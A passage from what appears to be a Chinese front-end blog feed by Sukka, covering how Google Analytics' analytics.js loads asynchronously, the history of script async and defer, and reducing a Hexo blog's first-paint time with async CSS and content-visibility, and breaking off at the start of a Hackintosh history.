出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 